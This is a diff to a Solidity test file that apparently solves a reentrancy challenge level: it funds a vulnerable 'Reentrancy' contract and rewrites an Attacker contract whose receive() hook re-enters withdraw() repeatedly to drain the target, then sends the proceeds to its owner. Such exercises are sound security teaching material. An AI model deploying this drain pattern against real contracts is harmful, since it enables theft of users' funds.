@@ -9,21 +9,24 @@ contract ReentrancyTest is Test {
     address player;
     Attacker attacker;
 
+    uint256 contractBalance = 1 ether;
+    uint256 playerBalance = 0.1 ether;
+
     function setUp() public {
         target = new Reentrancy();
 
-        // contract has 10 ether initiailly
-        payable(address(target)).transfer(10 ether);
+        // contract has some donations by the owner at first
+        target.donate{value: contractBalance}(address(this));
 
         // player starts with 1 ether
         player = makeAddr("player");
-        vm.deal(player, 1 ether);
+        vm.deal(player, playerBalance);
     }
 
     function attack() private {
         attacker = new Attacker(payable(target));
-        attacker.attack{value: 1 ether}();
-        attacker.withdraw();
+        attacker.attack{value: playerBalance}();
+        attacker.reap();
     }
 
     function testAttack() public {
@@ -38,37 +41,39 @@ contract ReentrancyTest is Test {
 }
 
 contract Attacker {
-    Reentrancy target;
-    address owner;
-    uint256 value = 0.001 ether;
+    address payable public owner;
+    Reentrancy targetContract;
+    uint256 donation;
 
-    constructor(address payable _target) payable {
-        target = Reentrancy(_target);
-        owner = msg.sender;
+    constructor(address payable _targetAddr) {
+        targetContract = Reentrancy(_targetAddr);
+        owner = payable(msg.sender);
     }
 
-    // gets the money from out of the contract to the player
-    function withdraw() public {
-        require(msg.sender == owner, "only the owner can withdraw");
-        (bool sent,) = owner.call{value: address(this).balance}("");
-        require(sent, "failed to withdraw");
+    // reap the rewards of your attack
+    function reap() external {
+        owner.transfer(address(this).balance);
     }
 
-    function attack() public payable {
-        require(msg.value >= value);
-        target.donate{value: msg.value}(address(this));
-        target.withdraw(msg.value);
-        value = msg.value;
+    // begin attack by depositing and withdrawing
+    // when all functions return, we will transfer funds to owner
+    function attack() external payable {
+        donation = msg.value;
+        targetContract.donate{value: donation}(address(this));
+        targetContract.withdraw(donation);
     }
 
+    // point of re-entry
     receive() external payable {
-        uint256 targetBalance = address(target).balance;
-        if (targetBalance >= value) {
+        uint256 targetBalance = address(targetContract).balance;
+        if (targetBalance >= donation) {
             // withdraw at most your balance at a time
-            target.withdraw(value);
-        } else if (targetBalance != 0) {
-            // withdraw the remaining positive balance in the contract
-            target.withdraw(targetBalance);
+            targetContract.withdraw(donation);
+        } else if (targetBalance > 0) {
+            // withdraw the remaining balance in the contract
+            // this edge case is when attacker donation does not
+            // perfectly divide the target balance
+            targetContract.withdraw(targetBalance);
         }
     }
 }
